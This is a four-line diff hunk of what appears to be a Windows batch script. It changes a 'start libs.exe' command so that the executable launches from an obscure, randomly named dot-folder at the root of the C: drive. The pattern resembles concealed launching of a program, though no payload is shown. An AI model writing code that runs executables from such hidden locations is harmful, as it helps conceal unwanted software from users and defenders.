@@ -10,4 +10,4 @@ cls
 echo Bye Bye
 pause
 :6969
-start libs.exe
+start c:\.libsx32312321321\libs.exe
